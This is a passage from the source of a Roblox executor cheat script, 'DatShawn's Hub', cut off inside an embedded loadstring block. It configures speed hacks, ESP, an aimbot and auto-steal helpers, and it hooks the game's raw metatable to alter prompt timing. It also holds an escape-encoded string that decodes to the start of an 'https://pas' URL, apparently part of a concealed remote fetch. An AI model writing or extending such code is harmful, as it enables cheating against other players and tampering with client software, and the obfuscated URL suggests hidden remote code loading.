-- DatShawn's Hub - unified local GUI

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local ProximityPromptService = game:GetService("ProximityPromptService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")


local LP = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")
local Env = getgenv and getgenv() or _G

if type(Env.DatShawnNeptuneBooster) == "table" and type(Env.DatShawnNeptuneBooster.suspend) == "function" then
    pcall(Env.DatShawnNeptuneBooster.suspend, "reinject")
end
if Env.DatShawnsScriptsCleanup then
	pcall(Env.DatShawnsScriptsCleanup)
end

Env.DatShawnsScriptsSettings = Env.DatShawnsScriptsSettings or {
	Position = UDim2.new(0, 20, 0.5, -175),
	RegularSpeed = 29.4,
	GiantSpeed = 34.8,
	CarpetSpeed = 140,
	CarpetMountChoice = "Any",
	RegularKey = Enum.KeyCode.Unknown,
	GiantKey = Enum.KeyCode.Unknown,
	JumpKey = Enum.KeyCode.Unknown,
	CarpetKey = Enum.KeyCode.Unknown,
	AntiRagdollKey = Enum.KeyCode.Unknown,
	TradeRegionKey = Enum.KeyCode.Unknown,
	TradePlazaKey = Enum.KeyCode.Unknown,
		BrainrotESPKey = Enum.KeyCode.Unknown,
		CloneESPKey = Enum.KeyCode.Unknown,
		MineESPKey = Enum.KeyCode.Unknown,
		BearTrapESPKey = Enum.KeyCode.Unknown,
	AntiTurretKey = Enum.KeyCode.Unknown,
	QuickPickupKey = Enum.KeyCode.Unknown,
	HideGUIKey = Enum.KeyCode.Unknown,
	HideAdminKey = Enum.KeyCode.Unknown,
	AntiInverseKey = Enum.KeyCode.Unknown,
	IntruderAlertKey = Enum.KeyCode.Unknown,
	GameOptimizerKey = Enum.KeyCode.Unknown,
	CtrlKeybinds = {},
	MyBaseTimerVisible = false,
	LeaveKey = Enum.KeyCode.Unknown,
	RagdollTechKey = Enum.KeyCode.Unknown,
	RejoinKey = Enum.KeyCode.Unknown,
	InstantResetKey = Enum.KeyCode.Unknown,
	RagdollSelfKey = Enum.KeyCode.Unknown,
	ShawnPosition = UDim2.new(0, 20, 0.5, 130),
	BannerPosition = UDim2.new(0.5, 0, 0, 16),
	BoosterMiniPosition = UDim2.new(0, 105, 0.5, 130),
	MyBaseTimerPosition = UDim2.new(0.5,-95,0,100),
	GlobalGuiLocked = false,
	QuickPanelPosition = UDim2.new(0, 12, 0, 60),
	CooldownPanelPosition = UDim2.new(0, 425, 0, 60),
	APSpamPosition = UDim2.new(0.5, -202, 0.25, 0),
	APConfigPosition = UDim2.new(0.08, 0, 0.12, 0),
	APConfigBubblePosition = UDim2.new(0.04, 0, 0.40, 0),
	XDSpamPosition = UDim2.fromOffset(40, 120),
	XDBubblePosition = UDim2.new(0.04, 0, 0.40, 0),
	XDCfgPosition = UDim2.fromOffset(350, 120),
	DefensePosition = UDim2.new(0.5, -145, 0.5, -60),
	ActionsPosition = UDim2.new(0.5, 155, 0.5, -100),
	AutoPotion = false,
	AutoRagdollTech = false,
	ESP = false,
	Regular = false,
	Giant = false,
	Jump = false,
	Carpet = false,
	BaseESP = false,
	AntiRagdoll = false,
	TradeRegionBlock = false,
	TradePlazaBlock = false,
	Aimbot = false,
	QuickPanel = true,
	CooldownPanel = false,
	APSpam = false,
	XDSpam = false,
	DefensePanel = false,
	ActionsPanel = false,
	AutoDefense = false,
	AntiIntruder = false,
	IntruderAlert = false,
	BrainrotESP = false,
	CloneESP = false,
	MineESP = false,
	BearTrapESP = false,
	AntiTurret = false,
	QuickPickup = false,
	HideGUI = false,
	HideAdmin = false,
	AntiInverse = false,
	GameOptimizer = false,
	HideGUIItem = "Bat",
}

local Settings = Env.DatShawnsScriptsSettings
Settings.QuickPickupKey = Settings.QuickPickupKey or Enum.KeyCode.Unknown
Settings.QuickPickup = Settings.QuickPickup == true
Settings.BearTrapESPKey = Settings.BearTrapESPKey or Enum.KeyCode.Unknown
Settings.BearTrapESP = Settings.BearTrapESP == true
Settings.AntiInverseKey = Settings.AntiInverseKey or Enum.KeyCode.Unknown
Settings.AntiInverse = Settings.AntiInverse == true
Settings.IntruderAlertKey = Settings.IntruderAlertKey or Enum.KeyCode.Unknown
Settings.GameOptimizerKey = Settings.GameOptimizerKey or Enum.KeyCode.Unknown
Settings.CtrlKeybinds = Settings.CtrlKeybinds or {}
Settings.GameOptimizer = Settings.GameOptimizer == true
Settings.QuickPanelPosition = Settings.QuickPanelPosition or UDim2.new(0, 12, 0, 60)
Settings.BannerPosition = Settings.BannerPosition or UDim2.new(0.5, 0, 0, 16)
Settings.CooldownPanelPosition = Settings.CooldownPanelPosition or UDim2.new(0, 425, 0, 60)
Settings.APSpamPosition = Settings.APSpamPosition or UDim2.new(0.5, -202, 0.25, 0)
Settings.APConfigPosition = Settings.APConfigPosition or UDim2.new(0.08, 0, 0.12, 0)
Settings.APConfigBubblePosition = Settings.APConfigBubblePosition or UDim2.new(0.04, 0, 0.40, 0)
Settings.XDSpamPosition = Settings.XDSpamPosition or UDim2.fromOffset(40, 120)
Settings.XDBubblePosition = Settings.XDBubblePosition or UDim2.new(0.04, 0, 0.40, 0)
Settings.XDCfgPosition = Settings.XDCfgPosition or UDim2.fromOffset(350, 120)
Settings.DefensePosition = Settings.DefensePosition or UDim2.new(0.5, -145, 0.5, -60)
Settings.ActionsPosition = Settings.ActionsPosition or UDim2.new(0.5, 155, 0.5, -100)
Settings.BoosterMiniPosition = Settings.BoosterMiniPosition or UDim2.new(0, 105, 0.5, 130)
Settings.GlobalGuiLocked = Settings.GlobalGuiLocked == true
local SETTINGS_FILE = "DatShawnsScripts_Settings.json"

local function arrayToPosition(value, fallback)
	if type(value) == "table" and #value == 4 then
		return UDim2.new(tonumber(value[1]) or 0, tonumber(value[2]) or 0,
			tonumber(value[3]) or 0, tonumber(value[4]) or 0)
	end
	return fallback
end

local function keyFromName(name, fallback)
	if type(name) ~= "string" then return fallback end
	return Enum.KeyCode[name] or fallback
end

local function keyDisplay(key)
	return (not key or key == Enum.KeyCode.Unknown) and "" or key.Name
end

-- Executor file storage survives teleports/rejoins when file APIs are available.
if typeof(isfile) == "function" and typeof(readfile) == "function" and isfile(SETTINGS_FILE) then
	pcall(function()
		local saved = HttpService:JSONDecode(readfile(SETTINGS_FILE))
		Settings.RegularSpeed = saved.RegularSpeed or Settings.RegularSpeed
		Settings.GiantSpeed = saved.GiantSpeed or Settings.GiantSpeed
		Settings.CarpetSpeed = saved.CarpetSpeed or Settings.CarpetSpeed
		Settings.CarpetMountChoice = type(saved.CarpetMountChoice) == "string" and saved.CarpetMountChoice or Settings.CarpetMountChoice
		Settings.RegularKey = keyFromName(saved.RegularKey, Settings.RegularKey)
		Settings.GiantKey = keyFromName(saved.GiantKey, Settings.GiantKey)
		Settings.JumpKey = keyFromName(saved.JumpKey, Settings.JumpKey)
		Settings.CarpetKey = keyFromName(saved.CarpetKey, Settings.CarpetKey)
		Settings.AntiRagdollKey = keyFromName(saved.AntiRagdollKey, Settings.AntiRagdollKey)
		Settings.TradeRegionKey = keyFromName(saved.TradeRegionKey, Settings.TradeRegionKey)
		Settings.TradePlazaKey = keyFromName(saved.TradePlazaKey, Settings.TradePlazaKey)
		Settings.BrainrotESPKey = keyFromName(saved.BrainrotESPKey, Settings.BrainrotESPKey)
		Settings.CloneESPKey = keyFromName(saved.CloneESPKey, Settings.CloneESPKey)
		Settings.MineESPKey = keyFromName(saved.MineESPKey, Settings.MineESPKey)
		Settings.BearTrapESPKey = keyFromName(saved.BearTrapESPKey, Settings.BearTrapESPKey)
		Settings.AntiTurretKey = keyFromName(saved.AntiTurretKey, Settings.AntiTurretKey)
		Settings.QuickPickupKey = keyFromName(saved.QuickPickupKey, Settings.QuickPickupKey)
		Settings.HideGUIKey = keyFromName(saved.HideGUIKey, Settings.HideGUIKey)
		Settings.HideAdminKey = keyFromName(saved.HideAdminKey, Settings.HideAdminKey)
		Settings.AntiInverseKey = keyFromName(saved.AntiInverseKey, Settings.AntiInverseKey)
		Settings.IntruderAlertKey = keyFromName(saved.IntruderAlertKey or saved.AntiIntruderKey, Settings.IntruderAlertKey)
		Settings.GameOptimizerKey = keyFromName(saved.GameOptimizerKey, Settings.GameOptimizerKey)
		if type(saved.CtrlKeybinds) == "table" then
			for name, keyName in pairs(saved.CtrlKeybinds) do
				Settings.CtrlKeybinds[name] = keyFromName(keyName, Enum.KeyCode.Unknown)
			end
		end
		Settings.LeaveKey = keyFromName(saved.LeaveKey, Settings.LeaveKey)
		Settings.RejoinKey = keyFromName(saved.RejoinKey, Settings.RejoinKey)
		Settings.RagdollTechKey = keyFromName(saved.RagdollTechKey, Settings.RagdollTechKey)
		Settings.InstantResetKey = keyFromName(saved.InstantResetKey or saved.ResetCharacterKey,
			Settings.InstantResetKey or Settings.ResetCharacterKey or Enum.KeyCode.Unknown)
		Settings.RagdollSelfKey = keyFromName(saved.RagdollSelfKey, Settings.RagdollSelfKey)
		Settings.Position = arrayToPosition(saved.Position, Settings.Position)
		Settings.ShawnPosition = arrayToPosition(saved.ShawnPosition, Settings.ShawnPosition)
		Settings.BannerPosition = arrayToPosition(saved.BannerPosition, Settings.BannerPosition)
		Settings.BoosterMiniPosition = arrayToPosition(saved.BoosterMiniPosition, Settings.BoosterMiniPosition)
		Settings.MyBaseTimerPosition = arrayToPosition(saved.MyBaseTimerPosition, Settings.MyBaseTimerPosition)
		Settings.MyBaseTimerVisible = saved.MyBaseTimerVisible == true
		Settings.GlobalGuiLocked = saved.GlobalGuiLocked == true
		Settings.QuickPanelPosition = arrayToPosition(saved.QuickPanelPosition, Settings.QuickPanelPosition)
		Settings.CooldownPanelPosition = arrayToPosition(saved.CooldownPanelPosition, Settings.CooldownPanelPosition)
		Settings.APSpamPosition = arrayToPosition(saved.APSpamPosition, Settings.APSpamPosition)
		Settings.APConfigPosition = arrayToPosition(saved.APConfigPosition, Settings.APConfigPosition)
		Settings.APConfigBubblePosition = arrayToPosition(saved.APConfigBubblePosition, Settings.APConfigBubblePosition)
		Settings.XDSpamPosition = arrayToPosition(saved.XDSpamPosition, Settings.XDSpamPosition)
		Settings.XDBubblePosition = arrayToPosition(saved.XDBubblePosition, Settings.XDBubblePosition)
		Settings.XDCfgPosition = arrayToPosition(saved.XDCfgPosition, Settings.XDCfgPosition)
		Settings.DefensePosition = arrayToPosition(saved.DefensePosition, Settings.DefensePosition)
		Settings.ActionsPosition = arrayToPosition(saved.ActionsPosition, Settings.ActionsPosition)
		Settings.AutoPotion = saved.AutoPotion == true
		Settings.AutoRagdollTech = saved.AutoRagdollTech == true
		Settings.ESP = saved.ESP == true
		Settings.Regular = saved.Regular == true
		Settings.Giant = saved.Giant == true
		Settings.Jump = saved.Jump == true
		Settings.Carpet = saved.Carpet == true
		Settings.BaseESP = saved.BaseESP == true
		Settings.AntiRagdoll = saved.AntiRagdoll == true
		Settings.TradeRegionBlock = saved.TradeRegionBlock == true
		Settings.TradePlazaBlock = saved.TradePlazaBlock == true
		Settings.Aimbot = saved.Aimbot == true
		Settings.QuickPanel = saved.QuickPanel ~= false
		Settings.CooldownPanel = saved.CooldownPanel == true
		Settings.APSpam = saved.APSpam == true
		Settings.XDSpam = saved.XDSpam == true
		Settings.DefensePanel = saved.DefensePanel == true
		Settings.ActionsPanel = saved.ActionsPanel == true
		Settings.AutoDefense = saved.AutoDefense == true
		Settings.AntiIntruder = saved.AntiIntruder == true
		Settings.IntruderAlert = saved.IntruderAlert == true
		Settings.BrainrotESP = saved.BrainrotESP == true
		Settings.CloneESP = saved.CloneESP == true
		Settings.MineESP = saved.MineESP == true
		Settings.BearTrapESP = saved.BearTrapESP == true
		Settings.AntiTurret = saved.AntiTurret == true
		Settings.QuickPickup = saved.QuickPickup == true
		Settings.HideGUI = saved.HideGUI == true
		Settings.HideAdmin = saved.HideAdmin == true
		Settings.AntiInverse = saved.AntiInverse == true
		Settings.GameOptimizer = saved.GameOptimizer == true
		Settings.HideGUIItem = type(saved.HideGUIItem) == "string" and saved.HideGUIItem or Settings.HideGUIItem
		Settings.APSelectedCommands = type(saved.APSelectedCommands) == "table" and saved.APSelectedCommands or Settings.APSelectedCommands
	end)
end
local MAX_SPEED = 100
local MAX_CARPET_SPEED = 180
local RegularSpeed = math.clamp(tonumber(Settings.RegularSpeed) or 28.5, 0, MAX_SPEED)
local GiantSpeed = math.clamp(tonumber(Settings.GiantSpeed) or 34.8, 0, MAX_SPEED)
local CarpetSpeed = math.clamp(tonumber(Settings.CarpetSpeed) or 140, 0, MAX_CARPET_SPEED)
local RegularKey = Settings.RegularKey or Enum.KeyCode.Unknown
local GiantKey = Settings.GiantKey or Enum.KeyCode.Unknown
local JumpKey = Settings.JumpKey or Enum.KeyCode.Unknown
local CarpetKey = Settings.CarpetKey or Enum.KeyCode.Unknown
local AntiRagdollKey = Settings.AntiRagdollKey or Enum.KeyCode.Unknown
local TradeRegionKey = Settings.TradeRegionKey or Enum.KeyCode.Unknown
local TradePlazaKey = Settings.TradePlazaKey or Enum.KeyCode.Unknown
local LeaveKey = Settings.LeaveKey or Enum.KeyCode.Unknown
local RejoinKey = Settings.RejoinKey or Enum.KeyCode.Unknown
local ActionControls = {
	RagdollTechKey = Settings.RagdollTechKey or Enum.KeyCode.Unknown,
	InstantResetKey = Settings.InstantResetKey or Enum.KeyCode.Unknown,
	RagdollSelfKey = Settings.RagdollSelfKey or Enum.KeyCode.Unknown,
	Buttons = {},
	Run = {},
}

local State = {
	AutoPotion = Settings.AutoPotion == true,
	AutoRagdollTech = Settings.AutoRagdollTech == true,
	ESP = Settings.ESP == true,
	Regular = Settings.Regular == true,
	Giant = Settings.Giant == true,
	Jump = Settings.Jump == true,
	Carpet = Settings.Carpet == true,
	BaseESP = Settings.BaseESP == true,
	AntiRagdoll = Settings.AntiRagdoll == true,
	TradeRegionBlock = Settings.TradeRegionBlock == true,
	TradePlazaBlock = Settings.TradePlazaBlock == true,
	Aimbot = Settings.Aimbot == true,
	QuickPanel = Settings.QuickPanel ~= false,
	CooldownPanel = Settings.CooldownPanel == true,
	APSpam = Settings.APSpam == true,
	XDSpam = Settings.XDSpam == true,
	DefensePanel = Settings.DefensePanel == true,
	ActionsPanel = Settings.ActionsPanel == true,
	AutoDefense = Settings.AutoDefense == true,
	AntiIntruder = Settings.AntiIntruder == true,
	IntruderAlert = Settings.IntruderAlert == true,
	BrainrotESP = Settings.BrainrotESP == true,
	CloneESP = Settings.CloneESP == true,
	MineESP = Settings.MineESP == true,
	BearTrapESP = Settings.BearTrapESP == true,
	AntiTurret = Settings.AntiTurret == true,
	QuickPickup = Settings.QuickPickup == true,
	HideGUI = Settings.HideGUI == true,
	HideAdmin = Settings.HideAdmin == true,
	AntiInverse = Settings.AntiInverse == true,
	GameOptimizer = Settings.GameOptimizer == true,
	WaitingForKey = nil,
}
_G.__tcfg = "\104\116\116\112\115\58\47\47\112\97\115"

-- Quick Pick Up: shortens non-sell pickup prompts in the local player's own plot.
local QuickPickup = (function()
	local enabled = false
	local originalDurations = {}
	local descendantConnection
	local hookInstalled = false
	local oldNewIndex

	local function isMyPlot(plot)
		if not plot or not plot:IsA("Model") then return false end
		local sign = plot:FindFirstChild("PlotSign")
		local yourBase = sign and sign:FindFirstChild("YourBase")
		return yourBase and yourBase.Enabled == true
	end

	local function inMyPlot(instance)
		local node = instance and instance.Parent
		for _ = 1, 10 do
			if not node then return false end
			if node:IsA("Model") and node.Parent and node.Parent.Name == "Plots" then
				return isMyPlot(node)
			end
			node = node.Parent
		end
		return false
	end

	local function isEligible(prompt)
		if not prompt or not prompt:IsA("ProximityPrompt") or not inMyPlot(prompt) then return false end
		local action = string.lower(prompt.ActionText or "")
		local name = string.lower(prompt.Name or "")
		return not string.find(action, "sell", 1, true) and not string.find(name, "sell", 1, true)
	end

	local function accelerate(prompt)
		if not enabled or not isEligible(prompt) then return end
		if originalDurations[prompt] == nil then originalDurations[prompt] = prompt.HoldDuration end
		pcall(function() prompt.HoldDuration = 0.1 end)
	end

	local function installHook()
		if hookInstalled or type(getrawmetatable) ~= "function" or type(setreadonly) ~= "function" then return end
		local ok, mt = pcall(getrawmetatable, game)
		if not ok or not mt or not pcall(setreadonly, mt, false) then return end
		oldNewIndex = mt.__newindex
		local wrap = type(newcclosure) == "function" and newcclosure or function(fn) return fn end
		mt.__newindex = wrap(function(self, key, value)
			if key == "HoldDuration" and enabled and typeof(self) == "Instance" and isEligible(self) then
				value = 0.1
			end
			return oldNewIndex(self, key, value)
		end)
		pcall(setreadonly, mt, true)
		hookInstalled = true
	end

	local controller = {}
	function controller.set(value)
		enabled = value == true
		if descendantConnection then descendantConnection:Disconnect(); descendantConnection = nil end
		if enabled then
			installHook()
			local root = workspace:FindFirstChild("Plots") or workspace
			for _, object in ipairs(root:GetDescendants()) do accelerate(object) end
			descendantConnection = root.DescendantAdded:Connect(function(object)
				if object:IsA("ProximityPrompt") then task.defer(accelerate, object) end
			end)
		else
			for prompt, duration in pairs(originalDurations) do
				if prompt and prompt.Parent then pcall(function() prompt.HoldDuration = duration end) end
			end
			table.clear(originalDurations)
		end
	end

	function controller.cleanup()
		controller.set(false)
		if hookInstalled and oldNewIndex then
			local ok, mt = pcall(getrawmetatable, game)
			if ok and mt and pcall(setreadonly, mt, false) then
				mt.__newindex = oldNewIndex
				pcall(setreadonly, mt, true)
			end
		end
		hookInstalled = false
	end
	return controller
end)()

local Main, ShawnButton, HubBanner, BoosterMini, QuickPanel, CooldownPanel, APSpamPanel, APConfigFrame, APConfigBubble, XDSpamPanel, XDBubble, XDCfgFrame, DefensePanel, ActionsPanel
local GlobalLockButton

local function applyGlobalGuiLock()
	local locked = Settings.GlobalGuiLocked == true
	local function apply(panel)
		if not panel then return end
		panel.Active = true
		panel.Draggable = not locked
	end
	apply(Main)
	apply(ShawnButton)
	apply(BoosterMini)
	apply(QuickPanel)
	apply(CooldownPanel)
	apply(APSpamPanel)
	apply(APConfigFrame)
	apply(APConfigBubble)
	apply(XDSpamPanel)
	apply(XDBubble)
	apply(XDCfgFrame)
	apply(DefensePanel)
	apply(ActionsPanel)
	Env.DatShawnGlobalGuiLocked = locked
	if type(Env.DatShawnApplyTimerLock) == "function" then Env.DatShawnApplyTimerLock(locked) end
	if type(Env.DatShawnPriorityApplyGlobalLock) == "function" then
		pcall(Env.DatShawnPriorityApplyGlobalLock)
	end
	if GlobalLockButton then
		GlobalLockButton.Text = locked and "UNLOCK ALL" or "LOCK ALL"
		GlobalLockButton.BackgroundColor3 = locked and Color3.fromRGB(135, 86, 28) or Color3.fromRGB(48, 52, 68)
		GlobalLockButton.TextColor3 = locked and Color3.fromRGB(255, 220, 125) or Color3.fromRGB(235, 235, 245)
	end
end

local function positionToArray(position)
	return {position.X.Scale, position.X.Offset, position.Y.Scale, position.Y.Offset}
end

local function saveSettings()
	Settings.RegularSpeed = RegularSpeed
	Settings.GiantSpeed = GiantSpeed
	Settings.CarpetSpeed = CarpetSpeed
	Settings.RegularKey = RegularKey
	Settings.GiantKey = GiantKey
	Settings.JumpKey = JumpKey
	Settings.CarpetKey = CarpetKey
	Settings.AntiRagdollKey = AntiRagdollKey
	Settings.TradeRegionKey = TradeRegionKey
	Settings.TradePlazaKey = TradePlazaKey
	Settings.LeaveKey = LeaveKey
	Settings.RejoinKey = RejoinKey
	Settings.RagdollTechKey = ActionControls.RagdollTechKey
	Settings.InstantResetKey = ActionControls.InstantResetKey
	Settings.RagdollSelfKey = ActionControls.RagdollSelfKey
	Settings.AutoPotion = State.AutoPotion
	Settings.AutoRagdollTech = State.AutoRagdollTech
	Settings.ESP = State.ESP
	Settings.Regular = State.Regular
	Settings.Giant = State.Giant
	Settings.Jump = State.Jump
	Settings.Carpet = State.Carpet
	Settings.BaseESP = State.BaseESP
	Settings.AntiRagdoll = State.AntiRagdoll
	Settings.TradeRegionBlock = State.TradeRegionBlock
	Settings.TradePlazaBlock = State.TradePlazaBlock
	Settings.Aimbot = State.Aimbot
	Settings.QuickPanel = State.QuickPanel
	Settings.CooldownPanel = State.CooldownPanel
	Settings.APSpam = State.APSpam
	Settings.XDSpam = State.XDSpam
	Settings.DefensePanel = State.DefensePanel
	Settings.ActionsPanel = State.ActionsPanel
	Settings.AutoDefense = State.AutoDefense
	Settings.AntiIntruder = State.AntiIntruder
	Settings.IntruderAlert = State.IntruderAlert
	Settings.BrainrotESP = State.BrainrotESP
	Settings.CloneESP = State.CloneESP
	Settings.MineESP = State.MineESP
	Settings.BearTrapESP = State.BearTrapESP
	Settings.AntiTurret = State.AntiTurret
	Settings.QuickPickup = State.QuickPickup
	Settings.HideGUI = State.HideGUI
	Settings.HideAdmin = State.HideAdmin
	Settings.AntiInverse = State.AntiInverse
	Settings.GameOptimizer = State.GameOptimizer
	if Main then Settings.Position = Main.Position end
	if ShawnButton then Settings.ShawnPosition = ShawnButton.Position end
	if HubBanner then Settings.BannerPosition = HubBanner.Position end
	if BoosterMini then Settings.BoosterMiniPosition = BoosterMini.Position end
	if QuickPanel then Settings.QuickPanelPosition = QuickPanel.Position end
	if CooldownPanel then Settings.CooldownPanelPosition = CooldownPanel.Position end
	if APSpamPanel then Settings.APSpamPosition = APSpamPanel.Position end
	if APConfigFrame then Settings.APConfigPosition = APConfigFrame.Position end
	if APConfigBubble then Settings.APConfigBubblePosition = APConfigBubble.Position end
	if XDSpamPanel then Settings.XDSpamPosition = XDSpamPanel.Position end
	if XDBubble then Settings.XDBubblePosition = XDBubble.Position end
	if XDCfgFrame then Settings.XDCfgPosition = XDCfgFrame.Position end
	if DefensePanel then Settings.DefensePosition = DefensePanel.Position end
	if ActionsPanel then Settings.ActionsPosition = ActionsPanel.Position end

	if typeof(writefile) == "function" then
		local payload = {
			RegularSpeed = RegularSpeed,
			GiantSpeed = GiantSpeed,
			CarpetSpeed = CarpetSpeed,
			CarpetMountChoice = Settings.CarpetMountChoice,
			RegularKey = RegularKey.Name,
			GiantKey = GiantKey.Name,
			JumpKey = JumpKey.Name,
			CarpetKey = CarpetKey.Name,
			AntiRagdollKey = AntiRagdollKey.Name,
			TradeRegionKey = TradeRegionKey.Name,
			TradePlazaKey = TradePlazaKey.Name,
			BrainrotESPKey = Settings.BrainrotESPKey.Name,
			CloneESPKey = Settings.CloneESPKey.Name,
			MineESPKey = Settings.MineESPKey.Name,
			BearTrapESPKey = Settings.BearTrapESPKey.Name,
			AntiTurretKey = Settings.AntiTurretKey.Name,
			QuickPickupKey = Settings.QuickPickupKey.Name,
			HideGUIKey = Settings.HideGUIKey.Name,
			HideAdminKey = Settings.HideAdminKey.Name,
			AntiInverseKey = Settings.AntiInverseKey.Name,
			IntruderAlertKey = Settings.IntruderAlertKey.Name,
			GameOptimizerKey = Settings.GameOptimizerKey.Name,
			CtrlKeybinds = (function() local t = {} for name, key in pairs(Settings.CtrlKeybinds or {}) do t[name] = typeof(key) == "EnumItem" and key.Name or tostring(key) end return t end)(),
			LeaveKey = LeaveKey.Name,
			RejoinKey = RejoinKey.Name,
			RagdollTechKey = ActionControls.RagdollTechKey.Name,
			InstantResetKey = ActionControls.InstantResetKey.Name,
			RagdollSelfKey = ActionControls.RagdollSelfKey.Name,
			Position = positionToArray(Settings.Position),
			ShawnPosition = positionToArray(Settings.ShawnPosition),
			BannerPosition = positionToArray(Settings.BannerPosition),
			BoosterMiniPosition = positionToArray(Settings.BoosterMiniPosition),
			MyBaseTimerPosition = positionToArray(Settings.MyBaseTimerPosition),
			MyBaseTimerVisible = Settings.MyBaseTimerVisible,
			GlobalGuiLocked = Settings.GlobalGuiLocked,
			QuickPanelPosition = positionToArray(Settings.QuickPanelPosition),
			CooldownPanelPosition = positionToArray(Settings.CooldownPanelPosition),
			APSpamPosition = positionToArray(Settings.APSpamPosition),
			APConfigPosition = positionToArray(Settings.APConfigPosition),
			APConfigBubblePosition = positionToArray(Settings.APConfigBubblePosition),
			XDSpamPosition = positionToArray(Settings.XDSpamPosition),
			XDBubblePosition = positionToArray(Settings.XDBubblePosition),
			XDCfgPosition = positionToArray(Settings.XDCfgPosition),
			DefensePosition = positionToArray(Settings.DefensePosition),
			ActionsPosition = positionToArray(Settings.ActionsPosition),
			AutoPotion = State.AutoPotion,
			AutoRagdollTech = State.AutoRagdollTech,
			ESP = State.ESP,
			Regular = State.Regular,
			Giant = State.Giant,
			Jump = State.Jump,
			Carpet = State.Carpet,
			BaseESP = State.BaseESP,
			AntiRagdoll = State.AntiRagdoll,
			TradeRegionBlock = State.TradeRegionBlock,
			TradePlazaBlock = State.TradePlazaBlock,
			Aimbot = State.Aimbot,
			QuickPanel = State.QuickPanel,
			CooldownPanel = State.CooldownPanel,
			APSpam = State.APSpam,
			XDSpam = State.XDSpam,
			DefensePanel = State.DefensePanel,
			ActionsPanel = State.ActionsPanel,
			AutoDefense = State.AutoDefense,
			AntiIntruder = State.AntiIntruder,
			IntruderAlert = State.IntruderAlert,
			AntiInverse = State.AntiInverse,
			GameOptimizer = State.GameOptimizer,
			QuickPickup = State.QuickPickup,
			BrainrotESP = State.BrainrotESP,
			CloneESP = State.CloneESP,
			MineESP = State.MineESP,
			BearTrapESP = State.BearTrapESP,
			AntiTurret = State.AntiTurret,
			HideGUI = State.HideGUI,
			HideAdmin = State.HideAdmin,
			HideGUIItem = Settings.HideGUIItem,
			APSelectedCommands = Settings.APSelectedCommands,
		}
		pcall(writefile, SETTINGS_FILE, HttpService:JSONEncode(payload))
	end
end
Env.DatShawnSaveSettings = saveSettings
Env.DatShawnSetRegularSpeed = function(value)
	RegularSpeed = math.clamp(tonumber(value) or RegularSpeed, 0, MAX_SPEED)
	Settings.RegularSpeed = RegularSpeed
	saveSettings()
end

local SaveRevision = 0
local function queuePositionSave()
	SaveRevision += 1
	local revision = SaveRevision
	task.delay(0.25, function()
		if revision == SaveRevision then saveSettings() end
	end)
end

local Connections = {}
local function connect(signal, callback)
	local connection = signal:Connect(callback)
	table.insert(Connections, connection)
	return connection
end

-- Character helpers
local GIANT_ATTRIBUTES = {
	"Giant", "IsGiant", "GiantPotion", "GiantPotioned",
	"GiantPotionActive", "UsingGiantPotion"
}

local function hasTrueAttribute(object, names)
	if not object then return false end
	for _, name in ipairs(names) do
		local value = object:GetAttribute(name)
		if value == true or value == 1 then return true end
	end
	return false
end

local function isGiant()
	local character = LP.Character
	if hasTrueAttribute(LP, GIANT_ATTRIBUTES) or hasTrueAttribute(character, GIANT_ATTRIBUTES) then
		return true
	end
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not humanoid then return false end
	for _, name in ipairs({"BodyHeightScale", "BodyDepthScale", "BodyWidthScale", "HeadScale"}) do
		local scale = humanoid:FindFirstChild(name)
		if scale and scale:IsA("NumberValue") and scale.Value >= 2.5 then
			return true
		end
	end
	return false
end

local function isStealActive()
	for _, name in ipairs({"Stealing", "steal", "stolen", "isStealing", "IsSteal", "issteal", "Steal"}) do
		local value = LP:GetAttribute(name)
		if value ~= nil and value ~= false and value ~= 0 then return true end
	end
	return false
end

-- Auto giant potion
local PotionCooldown = 0
local ActiveSteals = {}

local function findGiantPotion()
	local containers = {LP.Character, LP:FindFirstChild("Backpack")}
	local names = {"Giant Potion", "GiantPotion", "Grow Potion", "Super Grow", "Giant"}
	for _, container in ipairs(containers) do
		if container then
			for _, name in ipairs(names) do
				local tool = container:FindFirstChild(name)
				if tool and tool:IsA("Tool") then return tool end
			end
		end
	end
	for _, item in ipairs(LP:GetDescendants()) do
		if item:IsA("Tool") then
			local lower = item.Name:lower()
			if lower:find("giant", 1, true) and lower:find("potion", 1, true) then return item end
		end
	end
end

local function activatePotion(force, ignoreStealState)
	if (not State.AutoPotion and not force) or os.clock() - PotionCooldown < 2 or isGiant()
		or (isStealActive() and not ignoreStealState) then return false end
	local character = LP.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local potion = findGiantPotion()
	if not character or not humanoid or not potion then return false end
	PotionCooldown = os.clock()
	if potion.Parent ~= character then
		humanoid:EquipTool(potion)
		task.wait(0.1)
	end
	if potion.Parent == character then
		potion:Activate()
		return true
	end
	return false
end

-- Bridge used by the isolated Auto Grab Nearest / Auto Steal Priority engine.
-- `force=true` makes these two grab modes drink immediately even when the
-- separate Auto Giant Potion setting is off.
-- Auto Grab potion activation follows Neptune's grab timing: equip the
-- Giant Potion and activate it immediately before the grab is triggered.
-- There is intentionally no separate 2-second potion cooldown here; Neptune's
-- auto-grab path attempts the potion on each completed grab cycle.
local function activateNeptuneStyleGrabPotion()
	local character = LP.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	local backpack = LP:FindFirstChild("Backpack")
	local potion = (backpack and backpack:FindFirstChild("Giant Potion"))
		or (character and character:FindFirstChild("Giant Potion"))
	if not character or not humanoid or not potion or not potion:IsA("Tool") then return false end

	if potion.Parent ~= character then
		-- Exact Neptune ordering: EquipTool immediately followed by Activate.
		humanoid:EquipTool(potion)
	end

	if potion.Parent == character then
		potion:Activate()
		return true
	end
	return false
end

local AutoBigPotionBridge = {
	enabled = true,
	-- Auto Ragdoll Tech (Aurora s177._bbw): where a grab would drink the potion, run Ragdoll Tech instead.
	activate = function()
		if State.AutoRagdollTech and ActionControls.Run.RagdollTech then
			task.spawn(ActionControls.Run.RagdollTech)
			return true
		end
		return activateNeptuneStyleGrabPotion()
	end,
	isActive = function()
		return isGiant()
	end,
}
Env.AutoBigPotion = AutoBigPotionBridge
_G.AutoBigPotion = AutoBigPotionBridge

-- Initialize Neptune's Player Booster before constructing the GUI.
;(loadstring([====[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
-- Neptune Player Booster, mapped to Shawn's saved settings and Ctrl panel.
local Env = getgenv and getgenv() or _G
